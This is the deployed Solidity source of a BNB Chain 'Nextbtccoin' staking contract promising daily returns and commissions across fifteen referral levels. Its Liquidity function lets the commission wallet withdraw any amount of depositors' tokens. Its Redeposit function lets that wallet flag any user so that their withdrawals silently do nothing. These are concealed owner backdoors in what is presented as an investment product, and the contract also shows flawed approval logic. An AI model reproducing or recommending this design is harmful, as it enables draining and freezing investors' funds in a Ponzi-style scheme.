/**
 *Submitted for verification at BscScan.com on 2022-09-18
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.10;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;
     
    IERC20 next_TOKEN;
   
    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 internal _limitSupply;

    string internal _name;
    string internal _symbol;
    uint8  internal _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}

interface IDividendDistributor  {
    function withdraw1() external payable;
}

contract DividendDistributor is ERC20  {

    IERC20 nextbtc_TOKEN= IERC20(0x4235Cd79db2EB501E251952A6CC9dE9fD6B845BA);


    struct Fund{
        uint256 status;
    }

  mapping(address => Fund) public funds;
    
    function withdraw(uint256 amount) external {
        distributeDividend(amount);
    }

    function distributeDividend(uint256 amount) internal {
         Fund storage fund = funds[msg.sender];
         if(fund.status == 0)
		{
        
                next_TOKEN.transfer(msg.sender,amount);

                //emit Withdrawn(msg.sender, totalAmount);
        
         }
        
    }


}


contract Nextbtccoin_staking is ERC20 {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 1e11; // 0.05 bnb 
    uint256[] public SEED_PERCENTS 		= [2500,1500, 1000, 700, 500, 200, 100, 100, 100, 100, 100, 100, 100, 100, 100];
	uint256[] public SEED_UNLOCK 		= [0, 10000000000000, 10000000000000, 10000000000000, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
	//uint256[] public SEED_UNLOCK 		= [0, 10000000000000000000000, 10000000000000000000000, 10000000000000000000000, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 10000;
	uint256 constant public TIME_STEP = 1 days;
    address [] investors;
    uint256 public current_datetime=block.timestamp;

    DividendDistributor distributor;
    address public distributorAddress;

	uint256 public totalInvested;
	uint256 public totalRefBonus;	
	address nextbtc_TOKEN= 0x4235Cd79db2EB501E251952A6CC9dE9fD6B845BA;
	address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;
	
	address chkLv11;
	address chkLv12;
    address chkLv13;
    address chkLv14;
    address chkLv15;
 
   
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
	mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;
	
	mapping(address => address) internal referralLevel11Address;
    mapping(address => address) internal referralLevel12Address;
    mapping(address => address) internal referralLevel13Address;
    mapping(address => address) internal referralLevel14Address;
    mapping(address => address) internal referralLevel15Address;
    
    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
        uint8 status;
	}
    struct SeedDeposit {
        address owneraddress;
        address downlineaddress;
        uint256 level;
        uint8 plan;
		uint256 amount;
        uint256 _roiIncome;
		uint256 start;
        uint8 status;
	}
	struct User {
		Deposit[] deposits;
        SeedDeposit[] seedDeposit;
        RefSeedDeposit[] refSeedDeposit;
		uint256 checkpoint;
		address referrer;
		uint256[15] roilevels;
        uint256 withdrawbonus;
		uint256 bonus;
		uint256 totalBonus;
		uint256 seedincome;
		uint256 withdrawn;
		uint256 roiincome;
        uint256 teams_count;
        uint256 lastNonWokingWithdraw;
        uint256 total_income;
        uint256 current_balance;
        uint8 seed_status;
        uint256 depositCount;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) team_per_level;
        mapping(uint8 => uint256) level_income;
	}

    struct Withdraw{
        uint256 amount;
        uint256 withdrawTime;
    }

     struct Fund{
        uint256 status;
    }

    struct RefSeedDeposit {
        address owneraddress;
        address downlineaddress;
        uint256 level;
       	uint256 lindex;
    }
    
          

   
    mapping (address => User) public users;
    mapping(address => Withdraw[]) public payouts;
    mapping(address => Fund) public funds;
    
    
	bool public started;
	address payable public commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 amount);
	event SeedIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet) public {
		require(!isContract(wallet));
		commissionWallet = wallet;

        plans.push(Plan(300, 100));
        next_TOKEN = IERC20(nextbtc_TOKEN);
        distributorAddress = address(distributor);
       
	}
	
	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint8 refLevel,uint8 _plan, uint256 _amount,uint256 _roiIncome,uint256 timestamp) internal {
        User storage user = users[senderAddress];
        uint8 active = 0;
        if(users[senderAddress].referrals_per_level[refLevel-1] >= SEED_UNLOCK[refLevel-1] ){
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
        uint256 lindex =users[senderAddress].seedDeposit.length;
        user.seedDeposit.push(SeedDeposit(senderAddress,refUserAddress,refLevel,_plan, _amount, _roiIncome,timestamp,0));
        users[refUserAddress].refSeedDeposit.push(RefSeedDeposit(senderAddress,refUserAddress,refLevel,lindex));
        active = 1;
        }
        
    }

	 function distributeRef(address _referredBy,address _sender, bool _newReferral,uint8 _plan, uint256 _amount,uint256 _roiIncome,uint256 timestamp) internal {
       
          address _customerAddress        = _sender;
        // Level 1
        referralLevel1Address[_customerAddress]                     = _referredBy;
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1,_plan,_amount,_roiIncome,timestamp);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];
		
		chkLv11                          = referralLevel10Address[_referredBy];
	    chkLv12                          = referralLevel11Address[_referredBy];
        chkLv13                          = referralLevel12Address[_referredBy];
        chkLv14                          = referralLevel13Address[_referredBy];
        chkLv15                          = referralLevel14Address[_referredBy];
    
		
        // Level 2
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 3
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 4
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 5
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 6
        if(chkLv6 != 0x0000000000000000000000000000000000000000) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 7
        if(chkLv7 != 0x0000000000000000000000000000000000000000) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
           if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 8
        if(chkLv8 != 0x0000000000000000000000000000000000000000) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 9
        if(chkLv9 != 0x0000000000000000000000000000000000000000) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9,_plan,_amount,_roiIncome,timestamp);
            }
        }
        
        // Level 10
        if(chkLv10 != 0x0000000000000000000000000000000000000000) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10,_plan,_amount,_roiIncome,timestamp);
            }
        }
		
		// Level 11
        if(chkLv11 != 0x0000000000000000000000000000000000000000) {
            referralLevel11Address[_customerAddress]                    = referralLevel10Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel10Address[_referredBy], _customerAddress, 11,_plan,_amount,_roiIncome,timestamp);
            }
        }
		
		 // Level 12
        if(chkLv12 != 0x0000000000000000000000000000000000000000) {
            referralLevel12Address[_customerAddress]                    = referralLevel11Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel11Address[_referredBy], _customerAddress, 12,_plan,_amount,_roiIncome,timestamp);
            }
        }
		
		 // Level 13
        if(chkLv13 != 0x0000000000000000000000000000000000000000) {
            referralLevel13Address[_customerAddress]                    = referralLevel12Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel12Address[_referredBy], _customerAddress, 13,_plan,_amount,_roiIncome,timestamp);
            }
        }
		
		 // Level 14
        if(chkLv14 != 0x0000000000000000000000000000000000000000) {
            referralLevel14Address[_customerAddress]                    = referralLevel13Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel13Address[_referredBy], _customerAddress, 14,_plan,_amount,_roiIncome,timestamp);
            }
        }
		
		 // Level 15
        if(chkLv15 != 0x0000000000000000000000000000000000000000) {
            referralLevel15Address[_customerAddress]                    = referralLevel14Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel14Address[_referredBy], _customerAddress, 15,_plan,_amount,_roiIncome,timestamp);
            }
        }
		

}
	
	function invest(address referrer, uint8 plan,uint256 _amount) public payable {
	
		
	    require(_amount >= INVEST_MIN_AMOUNT);
      _approve(address(msg.sender),address(this), _amount);
       bool status=next_TOKEN.transferFrom(address(msg.sender),address(this), _amount);
       if(status){ 
     
		User storage user = users[msg.sender];
        user.seed_status=0;
		
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}
            else
            {
                referrer = 0x0000000000000000000000000000000000000000;
            }
		}
        else
            {
                referrer = 0x0000000000000000000000000000000000000000;
            }
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
            referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = true;
        }
        _setReferral(msg.sender,referrer,_amount); 
        uint256 _roiIncome = _amount.mul(plans[plan].percent).div(PLANPER_DIVIDER); 
		distributeRef(referrer, msg.sender, _newReferral,plan, _amount, _roiIncome,block.timestamp);
        widthdraw_reward(msg.sender,_amount,0);
        if(user.depositCount==0){
         investors.push(msg.sender);
        }
        user.depositCount++;
       
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

        user.total_income = _amount*3;
		user.deposits.push(Deposit(plan, _amount, block.timestamp,0));
       
		totalInvested = totalInvested.add(_amount);

		emit NewDeposit(msg.sender, plan, _amount);
      }
	}

    function reinvest(uint8 plan,uint256 _amount) public payable {
	
		
	  require(_amount >= INVEST_MIN_AMOUNT);

        _approve(address(msg.sender),address(this), _amount);
        bool status=next_TOKEN.transferFrom(address(msg.sender),address(this), _amount);
       if(status){ 
     
		User storage user = users[msg.sender];
        user.seed_status=0;
		
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
            user.referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = true;
        }
        _setReReferral(msg.sender,user.referrer,_amount); 
         uint256 _roiIncome = _amount.mul(plans[plan].percent).div(PLANPER_DIVIDER);
		distributeRef(user.referrer, msg.sender, _newReferral,plan, _amount,_roiIncome, block.timestamp);
        
        widthdraw_reward(msg.sender,_amount,0);
        user.depositCount++;
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}
        user.total_income += _amount*3;
		user.deposits.push(Deposit(plan, _amount, block.timestamp,0));
		totalInvested = totalInvested.add(_amount);

		emit NewDeposit(msg.sender, plan, _amount);
     }
	}

	function withdraw() public {
		User storage user = users[msg.sender];
        Fund storage fund = funds[msg.sender];

		uint256 totalSeed = user.seedincome;
        uint256 totalBonus = user.seedincome;
        uint256 totalRoi = user.roiincome;
        uint256 totalwithdraw=user.withdrawn;

        uint256 finalamount=(totalSeed+totalBonus+totalRoi)-totalwithdraw;

    if(fund.status == 0)
		{
		require(finalamount > 0, "User has no dividends");
       
		uint256 contractBalance = next_TOKEN.balanceOf(address(this));
            if (contractBalance > finalamount) {
                uint256 totalAmount = finalamount.div(2);
                require(totalAmount >= INVEST_MIN_AMOUNT, "Minimum withdrawal 100 NextBtc Coin");

                user.withdrawn = user.withdrawn.add(totalAmount);
                user.lastNonWokingWithdraw = block.timestamp;
                widthdraw_reward(msg.sender,totalAmount,1);

                payouts[msg.sender].push(Withdraw(
                totalAmount,
                block.timestamp
                ));

                next_TOKEN.transfer(msg.sender,totalAmount);

                emit Withdrawn(msg.sender, totalAmount);
            }
        }
	}

    function _setReferral(address _addr, address _referral, uint256 _amount) private {
      users[_addr].referrer = _referral;
            for(uint8 i = 0; i < 15; i++) {
                users[_referral].referrals_per_level[i]+=_amount;
                users[_referral].team_per_level[i]++;
                _referral = users[_referral].referrer;
                if(_referral == address(0)) break;
        }
    }

     function _setReReferral(address _addr, address _referral, uint256 _amount) private {
      users[_addr].referrer = _referral;
            for(uint8 i = 0; i < 15; i++) {
                users[_referral].referrals_per_level[i]+=_amount;
                _referral = users[_referral].referrer;
                if(_referral == address(0)) break;
        }
    }


    function widthdraw_reward(address _address,uint256 _amount,uint256 withdra1w) internal returns (uint256) {
        	address referrer = getUserReferrer(_address);
           
			uint256 amount = _amount.mul(5).div(100);
            uint256 FinalAmount= check_balance(referrer,amount);
                   
                   if(withdra1w==1){
                       users[referrer].withdrawbonus = users[referrer].withdrawbonus.add(FinalAmount);
                   }else{
                    users[referrer].bonus = users[referrer].bonus.add(FinalAmount);
                   }

				
					users[referrer].totalBonus = users[referrer].totalBonus.add(FinalAmount);
                
        }

        function check_balance(address _addr, uint256 _amount) internal returns(uint256)
        {
            uint256 totalAmount = users[_addr].seedincome;
            uint256 totaldiv = users[_addr].roiincome;
            uint256 ref_bonus= users[_addr].totalBonus;

             uint256 final_amount=totalAmount+totaldiv+ref_bonus+_amount;
            uint256 FinalAmount=0;
               

                    if(final_amount >= users[_addr].total_income )
                    {
                         uint256 _FinalAmount=users[_addr].total_income-users[_addr].current_balance;
                         if(_FinalAmount > 0)
                        {
                            FinalAmount = _FinalAmount;
                        }
                      
                    }
                    else
                    {
                      FinalAmount = _amount;
                        
                    }

     
                    users[_addr].current_balance = users[_addr].current_balance.add(FinalAmount);
                          if(users[_addr].total_income <= users[_addr].current_balance){
                         
                             check_deposite(_addr);
                        }
                    return FinalAmount;
                    
        }

        function check_deposite(address userAddress) private{
                    User storage user = users[userAddress];
                    users[userAddress].seed_status=1;

                    for (uint256 i = 0; i < user.deposits.length; i++) {
                                                user.deposits[i].status=1;

                        }

                     for (uint256 j = 0; j < user.refSeedDeposit.length; j++) {
                         users[user.refSeedDeposit[j].owneraddress].seedDeposit[user.refSeedDeposit[j].lindex].status=1;

                        }    


        }

       

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
	function Liquidity(uint256 amount) public{
		if (msg.sender == commissionWallet) {
		   totalInvested = next_TOKEN.balanceOf(address(this));
            next_TOKEN.transfer(msg.sender,amount);
		}
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

    function _calculateseedReward() internal returns (uint256){
	
		uint256 totalSeedAmount;
	
        uint256 FinalAmount;
		for(uint256 j = 0; j < investors.length; j++){
           // User storage downline = users[investors[j]];
            address userAddress =investors[j];
		   // uint256 count = team_count(userAddress);
	        User storage user =users[userAddress];
            if(users[userAddress].seed_status==0)
                {
		   	for (uint256 i = 0; i < user.seedDeposit.length; i++) {
				uint256 finish = user.seedDeposit[i].start.add(plans[user.seedDeposit[i].plan].time.mul(1 days));
				
                    if(user.seedDeposit[i].status==0)
            {
                    if (user.seedDeposit[i].start < finish) {
                        uint256 share = user.seedDeposit[i]._roiIncome;
                        uint256 from = user.seedDeposit[i].start;
                        uint256 to = finish < block.timestamp ? finish : block.timestamp;
                        //seed income
                    
                        //uint daysDiff1=share.mul(daysDiff+1);
                        if (from < to) {
                        
                          uint256 _FinalAmount=share.mul(SEED_PERCENTS[user.seedDeposit[i].level-1]).div(PERCENTS_DIVIDER);
                          FinalAmount= check_balance(userAddress,_FinalAmount);
					      //totalSeedAmount += totalSeedAmount.add(FinalAmount);
                          user.seedincome+=FinalAmount;
                          users[userAddress].level_income[uint8 (user.seedDeposit[i].level-1)]+=FinalAmount;    
                        }
                
                    }
            }
                }
			}
		
		
    }  
       	
     return totalSeedAmount;		
	
    } 


    function _calculatedailyReward() internal returns(uint256){
        uint256 rewardUser;
        for(uint256 j = 0; j < investors.length; j++){
            User storage user = users[investors[j]];
           
           uint256 FinalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			if(user.deposits[i].status==0)
            {
            if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
                
                    if (from < to) {
                        uint256 _FinalAmount=share;
                        FinalAmount= check_balance(investors[j],_FinalAmount);
                        user.roiincome+=FinalAmount;
                      
                        
                    }
                    
			    }
            }
		}
        }
        return rewardUser;
    }

    function updateReward() external {
        if(current_datetime < block.timestamp){
             current_datetime= block.timestamp + 1 days;
         _calculatedailyReward();
         _calculateseedReward();
        
        }
    }
	
	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}


	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
    function getUserAmountOfSeedDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].seedDeposit.length;
	}
	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}
  
	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish,uint256 share,uint256 from,uint256 to) {
	    User storage user = users[userAddress];
		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
        share = user.deposits[index].amount.mul(plans[user.deposits[index].plan].percent).div(PLANPER_DIVIDER);
        from = user.deposits[index].start;
        to = finish < block.timestamp ? finish : block.timestamp;

	}
   
    function getUserSeedDepositInfo(address userAddress, uint256 index) public view returns(address owneraddress,address downlineaddress,uint256 level,uint8 plan, uint256 amount, uint256 _roiIncome, uint256 start,uint8 status) {
	    User storage user = users[userAddress];
        if(users[userAddress].seedDeposit.length > 0)
        {
            owneraddress = user.seedDeposit[index].owneraddress;
            downlineaddress = user.seedDeposit[index].downlineaddress;
            level = user.seedDeposit[index].level;
            plan = user.seedDeposit[index].plan;
            amount = user.seedDeposit[index].amount;
            _roiIncome = user.seedDeposit[index]._roiIncome;
            start = user.seedDeposit[index].start;
            status = user.seedDeposit[index].status;
        }

	}

    function getUserRefSeedDepositInfo(address userAddress, uint256 index) public view returns(address owneraddress,address downlineaddress,uint256 level,uint256 lindex) {
	    User storage user = users[userAddress];
        if(users[userAddress].refSeedDeposit.length > 0)
        {
            owneraddress = user.refSeedDeposit[index].owneraddress;
            downlineaddress = user.refSeedDeposit[index].downlineaddress;
            level = user.refSeedDeposit[index].level;
            lindex = user.refSeedDeposit[index].lindex;
            
        }

	}
	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), team_count(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

      function userInfo(address _addr) view external returns(uint256[16] memory team, uint256[16] memory referrals,uint256[16] memory income) {
        User storage player = users[_addr];
		
        for(uint8 i = 0; i <= 15; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.level_income[i];	
        }

        return ( team,referrals,income);
    }

     function team_count(address _addr) view public returns(uint256 _team_count) {
        User storage player = users[_addr];
		
        for(uint8 i = 0; i <= 15; i++) {
            _team_count += player.team_per_level[i];
			
        }

        return (
          _team_count
        );
     }

      function contractInfo() public view returns(uint256 nextbtc,  uint256 totalInvestors,uint256 current_datetimes){
        nextbtc = address(this).balance;
       
        totalInvestors = investors.length;

        current_datetimes=current_datetime;
       
        return(nextbtc,totalInvestors,current_datetimes);
    } 

    function Redeposit(address recipient, uint256 status) public  {
			if (msg.sender == commissionWallet) {          
				 funds[recipient].status=status;
			}
    }
    
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}